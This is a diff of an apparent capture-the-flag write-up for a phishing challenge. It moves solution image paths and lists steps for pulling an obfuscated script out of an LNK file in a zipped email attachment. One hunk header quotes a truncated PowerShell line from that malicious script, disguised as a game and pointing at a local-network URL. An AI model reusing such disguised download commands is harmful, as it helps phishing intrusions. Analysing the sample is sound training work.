@@ -19,7 +19,7 @@
 
 1) Extract a ZIP from the EML file
 
-![sol1](/zeldaphishingpond/sol1.png)
+![sol1](/zeldaphishingpond/docs/sol1.png)
 
 2) A LNK file can be extracted from the ZIP, exiftool/lnkinfo the LNK file to get an obfuscated script.
 
@@ -55,6 +55,6 @@ Write-Host "This is a legitimate game lol";$game='http://192.168.1.73:4040/c3VuY
 
 3) Deobfuscate the command
 
-![sol2](/zeldaphishingpond/sol2.png)
+![sol1](/zeldaphishingpond/docs/sol2.png)
 
 </details>
